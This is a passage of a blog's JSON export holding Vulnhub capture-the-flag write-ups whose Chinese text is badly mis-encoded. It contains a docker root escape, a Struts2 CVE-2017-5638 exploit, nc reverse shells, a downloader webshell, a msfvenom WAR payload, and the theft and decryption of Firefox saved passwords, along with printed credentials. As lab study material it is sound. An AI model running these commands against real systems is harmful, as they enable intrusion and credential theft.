æƒ…ç†ä¹‹ä¸­ æ„æ–™ä¹‹å¤– ä½¿ç”¨sudo â€“læŸ¥çœ‹sudoçš„æƒé™ å‘ç°apaarå¯ä»¥ææƒï¼Ÿé‚£å°±é€ ä»– æŸ¥çœ‹apaaræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ å‘ç°apaarä¸‹æœ‰ä¸ªtxtæ–‡ä»¶ ä½†ç”±äºæƒé™æ–‡ä»¶æˆ‘ä»¬æ— æ³•è®¿é—® ä½†ä¸Šè¿°æåˆ°äº† apaarä¸‹æœ‰ä¸ªshè„šæœ¬æˆ‘ä»¬å¯ä»¥æ‰§è¡Œ é‚£å°±æ‰§è¡Œå®ƒ å®ƒéœ€è¦ä¸€ä¸ªåå­— å’±ä»¬éšä¾¿è¾“å…¥å³å¯ æ‰§è¡Œå®Œæ¯•äº† ä½†æˆ‘ä¸çŸ¥é“å®ƒæœ‰æ•ˆæœ é‚£å°±é˜…è¯»ä¸€ä¸‹å§ è¿™ä¸ªæ‰¹å¤„ç† æœ‰ç‚¹æ„æ€å•Š ä¼¼ä¹å¯ä»¥å‘½ä»¤æ‰§è¡Œ å°è¯•æˆåŠŸ æœ‰ç‚¹æ„æ€ æ—¢ç„¶æˆ‘ä»¬æ²¡æœ‰æƒé™è¯»å–local.txtæ–‡ä»¶ é‚£å°±è®©apaaræ¥è¯»å–å§ å•Šè¿™ æˆ‘è¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆææƒçš„ä¸œè¥¿å‘¢ ç»“æœä½ å‘Šè¯‰æˆ‘ è¿™å°±æ˜¯ä¸ªflagï¼Ÿ é‚£ä¹Ÿè¡Œå§ flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww} OK å’±ä»¬ç»§ç»­æ‰¾å…¶ä»–æ–¹æ³•ææƒå§ è¾“å…¥idæŸ¥çœ‹æƒé™ å—¯ï¼Ÿdockerï¼Ÿè¦ç´ å¯Ÿè§‰ æˆ‘ä»¬ä½¿ç”¨ä¸€äº›ææƒè¾…åŠ©å·¥å…·https://gtfobins.github.io/ åœ¨é‡Œé¢æœæœdocker ä½¿ç”¨æ­¤å‘½ä»¤å³å¯ææƒdocker run -v &#x2F;:&#x2F;mnt â€“rm -it alpine chroot &#x2F;mnt sh ææƒæˆåŠŸ è¿›å…¥rootç›®å½• æ‹¿åˆ°æœ€åä¸€ä¸ªflag Flag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg} æ€»ç»“è¯­ï¼šæ€ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªé¶åœºè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚æˆ‘èµ·åˆä»¥ä¸ºå°±æ˜¯ç®€å•çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œgetshellä»¥åä¸€ä¸ªè„šæœ¬ææƒå°±æ‹¿ä¸‹äº†ã€‚æ²¡æƒ³åˆ°è¿˜æœ‰è¿™ä¹ˆå¤šæ­¥éª¤ï¼ŒæŒºä¸¥è°¨çš„å§","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]},{"title":"Vulnhub - BlueSky é¶åœºå®æˆ˜","slug":"BlueSky","date":"2021-10-07T08:31:38.000Z","updated":"2023-05-19T09:04:38.309Z","comments":true,"path":"2021/10/07/BlueSky/","link":"","permalink":"http://www.lucifiel.com/2021/10/07/BlueSky/","excerpt":"","text":"é¶åœºå®æˆ˜ Vulnhub-BlueSkyé¦–å…ˆä½¿ç”¨kaliæ‰«æé¶åœºçš„IPåœ°å€ Arp-scan â€“l å¯¹æ¯”MACåœ°å€ æˆåŠŸå¾—åˆ°é¶åœºIPåœ°å€192.168.72.131 è¿›è¡Œç«¯å£æ‰«æ Nmap â€“Sv â€“v 192.168.72.131 å¼€æ”¾äº†ç«¯å£22å’Œ8080 22ä¸ºSSHç«¯å£ï¼Œçªç ´å¤šåŠéƒ½æ˜¯å¼±å£ä»¤ï¼Œå’±ä»¬å…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µï¼Œè®¿é—®8080çš„WEBæœåŠ¡å™¨çœ‹çœ‹ http://192.168.72.131:8080 è®¿é—®åå‘ç°æ˜¯tomcat 9.0.40 ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†tomcatçš„cveæ¼æ´ ä½¿ç”¨searchsploitæœç´¢ tomcat 9.0.40çš„æ¼æ´ å—¯â€¦å¥½åƒæ²¡æœ‰ é‚£å°±æµ‹è¯•ä¸€æ³¢0dayå§(å¼±å£ä»¤) Tomcat&#x2F;tomcat Admin&#x2F;admin OK ç¡®è®¤æ²¡æœ‰0day é‚£å°±åªèƒ½æ‰¾è¯¥ç‰ˆæœ¬å­˜åœ¨çš„æ¼æ´äº† åœ¨ç™¾åº¦æ‰¾åˆ°ä¸€ä¸ªstruts2-showcaseçš„æ¼æ´ï¼ˆs2-048è¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ å¥½å®¶ä¼™ ç›´æ¥ä¸Šå·¥å…·äº†å“ˆ å°±æ‡’å¾—å†æµ‹è¯•äº† url: http://192.168.72.131:8080/struts2-showcase/index.action å¥½å®¶ä¼™ è¿™ä¸ªURLæˆ‘çˆ†ç›®å½•è¿˜æ²¡çˆ†å‡ºæ¥ åœ¨ç½‘ä¸Šæœç´¢ç›¸å…³æ¼æ´æ‰æ‰¾åˆ° ä¸‹è½½exp git clone https://github.com/jrrdev/cve-2017-5638.git æµ‹è¯•æ˜¯å¦å­˜åœ¨æ¼æ´ python exploit.py â€œhttp://192.168.72.131:8080/struts2-showcase/index.action&quot; â€œwhoamiâ€ whoamiæ‰§è¡ŒæˆåŠŸ æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ncæƒé™ python exploit.py â€œhttp://192.168.72.131:8080/struts2-showcase/index.action&quot; â€œncâ€ å­˜åœ¨ncæƒé™çš„ ä½†ä¼¼ä¹æ²¡æœ‰nc â€“eçš„æƒé™ å¾—é€šè¿‡å…¶ä»–æ–¹å¼åå¼¹shelläº† é¦–å…ˆä½¿ç”¨mknodå»ºç«‹ç®¡é“ Python exploit.py â€œhttp://192.168.72.131:8080/struts2-showcase/index.action&quot; â€œmknod &#x2F;tmp&#x2F;backpipe pâ€ Kaliç›‘å¬4444ç«¯å£ Nc â€“nvlp 4444 åå¼¹shellï¼Œå°†å†…å®¹ä¼ é€’ç‰©ä½¿ç”¨ç®¡é“æ–‡ä»¶pä½œä¸ºæ¡¥æ¢ï¼Œè¿›è¡Œæ•°æ®é‡å®šå‘ä¼ é€’ python exploit.py â€œhttp://192.168.72.131:8080/struts2-showcase/index.action&quot; -c â€œ&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;p | nc 192.168.72.133 4444 1&gt;&#x2F;tmp&#x2F;pâ€ æ­£å¸¸æ¥è¯´ç°åœ¨kaliæ˜¯ä¼šè·å–åˆ°ä¸€ä¸ªncçš„shellçš„ï¼Œä½†æˆ‘è¿™è¾¹ä¸çŸ¥é“ä»€ä¹ˆåŸå› æ— æ³•æˆåŠŸï¼Œå…ˆæ•™å¤§å®¶æ­¤æ–¹æ³•ç»§ç»­æ“ä½œçš„æ–¹æ³•ï¼Œæˆ‘å†æ¼”ç¤ºæˆ‘è‡ªå·±åšçš„æ›¿ä»£çš„æ–¹æ³• è·å–åˆ°shellååœ¨shellå†…è¿è¡Œ python3 -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™ å› ä¸ºé¶æœºç¯å¢ƒå†…æ²¡æœ‰python2çš„ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨python3æå‡ä¸ºä¸€ä¸ªäº¤äº’å¼shellå°±å¯ä»¥äº† ç¬¬äºŒç§æ–¹æ³•ï¼š ç¬¬äºŒç§æ–¹æ³•æˆ‘ä»¬ä½¿ç”¨windowæ¥è¿›è¡Œæ¸—é€ é¦–å…ˆä½¿ç”¨struts2çš„å›¾å½¢åŒ–éªŒè¯å·¥å…·è¿›è¡Œæ¼æ´éªŒè¯ å¾—åˆ°ç›®å½•åœ°å€ webpath:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;struts2-showcase&#x2F; ç›´æ¥ä¸Šä¼ å¤§é©¬ä¼šè¶…å‡ºå­—èŠ‚é™åˆ¶ ä¸Šä¼ å†°èçš„é©¬å†°èä¼šæ— æ³•è¯†åˆ«webshellçš„å¯†ç  ç›´æ¥ä¸Šä¼ èšå‰‘çš„é©¬ä¹Ÿä¼šè¶…å‡ºå­—èŠ‚é™åˆ¶ é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ å¾ˆå¥½è§£å†³ï¼Œé¦–å…ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„ä¸€å¥è¯æœ¨é©¬ å¾—åˆ°webshellåœ°å€ http://192.168.72.131:8080/struts2-showcase/111.jsp ç„¶ååœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªwebæœåŠ¡å™¨ï¼ŒæŠŠè¦ä½¿ç”¨çš„ä¸€å¥è¯æœ¨é©¬æˆ–å¤§é©¬æ”¾åœ¨é‡Œé¢ï¼Œä½¿ç”¨è¯¥ä¸€å¥è¯æœ¨é©¬è¿›è¡Œè®¿é—®ä¸‹è½½ http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp ä¸Šé¢çš„222.jspæ˜¯è¦ä¿å­˜çš„webshellé©¬åå­— 333.jspæ˜¯æˆ‘ä»¬åœ¨æœ¬åœ°webæœåŠ¡å™¨å†…å‚¨å­˜çš„åå­— 111.jspæ˜¯å½“å‰çš„ä¸‹è½½é©¬ æˆåŠŸä¸‹è½½èšå‰‘çš„ä¸€å¥è¯æœ¨é©¬ å¯ä»¥æˆåŠŸè®¿é—®æ–‡ä»¶ï¼Œä½†æˆ‘ä»¬å‘ç°è¯¥ä¸€å¥è¯æœ¨é©¬ä¼¼ä¹æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ å°é—®é¢˜ï¼Œæˆ‘ä»¬åˆ©ç”¨tomcatæœ¬èº«çš„æ¼æ´è¿›è¡Œææƒå°±å¥½äº† é¦–å…ˆæ‰¾åˆ°tomcatçš„è´¦å·æœ¨é©¬ åœ°å€ï¼š&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;tomcat-users.xml ç¬¬45è¡Œ æˆåŠŸå¾—åˆ° è´¦å·ï¼šadmin å¯†ç ï¼š6mzf3&gt;gfZ.pN8_Mp æ³¨æ„ï¼šæ­¤æ–¹æ³•è¾ƒä¸ºéº»çƒ¦ï¼Œä¸»è¦ç”¨äºæ— æ³•ä½¿ç”¨ncå¼¹å›shellçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œæˆ‘è¿™è¾¹ä½¿ç”¨äº†å„ä¸ªæ–¹æ³•éƒ½æ— æ³•å¼¹å›ï¼Œä¸å¾—å·²ä¹‹ä¸‹æ‰ä½¿ç”¨è¿™ä¸ªæ–¹æ³• ç°åœ¨æˆ‘ä»¬å›åˆ°ç½‘é¡µå»ç™»å½•è´¦å·å¯†ç  ç™»é™†åçš„çŠ¶æ€ æˆ‘ä»¬å‘ç°ä¸‹é¢å¯ä»¥éƒ¨ç½²æ–‡ä»¶ï¼ŒOK é‚£å°±å¥½åŠäº† ä½¿ç”¨WARæœ¨é©¬ä¸Šä¼ åå¼¹shellå°±æå®šäº† ä½¿ç”¨msfvenomç”Ÿæˆwaré©¬ msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.72.133 LPORT&#x3D;5555 -f war -o shell.war OK æˆ‘ä»¬å»ä¸Šä¼  æˆåŠŸä¸Šä¼ åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°&#x2F;shell è¿™å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„waré©¬ åœ¨kaliä¸­ç›‘å¬5555ç«¯å£ Nc â€“nvlp 5555 ç„¶åå»è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„waré©¬ curl http://192.168.72.131:8080/shell/ OK æˆ‘ä»¬æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell åŒæ ·çš„æˆ‘ä»¬ä½¿ç”¨python3è·å–ä¸€ä¸ªäº¤äº’å¼shell python3 -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™ æŸ¥çœ‹user.txtæ–‡ä»¶ æˆåŠŸè·å–userè´¦æˆ·çš„flag æˆ‘ä»¬æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶ Ls â€“a åœ¨ç”¨æˆ·æ ¹ç›®å½•ä¸‹å‘ç°mozilla firefoxæµè§ˆå™¨æ–‡ä»¶ å¯¹æˆ‘æ¥è¯´ï¼Œæœ€æƒ³è¦å¾—åˆ°çš„å°±æ˜¯å®ƒçš„ç”¨æˆ·åå¯†ç è®°å½• ä¸åŒç‰ˆæœ¬çš„Firefoxä¿å­˜å¯†ç è®°å½•çš„æ–‡ä»¶åç§°ä¸åŒï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°firefoxæµè§ˆå™¨å­˜å‚¨ç”¨æˆ·åå¯†ç çš„æ–‡ä»¶æ˜¯logins.jsonï¼ˆç‰ˆæœ¬å·å¤§äºç­‰äº32.0ï¼‰æˆ–è€…signons.sqliteï¼ˆç‰ˆæœ¬å·å¤§äºç­‰äº3.5ï¼Œå°äº32.0ï¼‰ï¼Œ å…·ä½“ä¿¡æ¯å‚è€ƒï¼šhttp://kb.mozillazine.org/Profile_folder_-_Firefox è¿›å…¥ä½ç½® .mozilla&#x2F;firefox&#x2F;fvbljmev.default-release å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶ key4.db logins.json æˆ‘ä»¬è¦æŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶æå‡ºæ¥ ä½¿ç”¨python3å¼€å¯webæœåŠ¡å™¨ python3 -m http.server 6666 ä½¿ç”¨wgetæˆåŠŸæ‹·è´ä¸¤ä¸ªæ–‡ä»¶ wget http://192.168.72.131:6666/logins.json wget http://192.168.72.131:6666/key4.db ä¸‹è½½è§£å¯†è„šæœ¬ https://github.com/lclevy/firepwd git clone https://github.com/lclevy/firepwd.git cd firepwd pip3 install -r requirements.txt è¿è¡Œpython3 firepwd.py https://twitter.com:b'minhtuan',b'skysayohyeahâ€˜ å¾—åˆ°è´¦å·ï¼šminhtuan å¾—åˆ°å¯†ç ï¼šskysayohyeah æˆ‘ä»¬ä½¿ç”¨sudo â€“læŸ¥çœ‹sudoæƒé™ æƒé™æŒºé«˜ ç›´æ¥sudo suå³å¯æˆåŠŸææƒ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag æœ¬æ¬¡é¶åœºå®Œæˆ","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]}],"categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"},{"name":"TryHackMe","slug":"TryHackMe","permalink":"http://www.lucifiel.com/tags/TryHackMe/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]}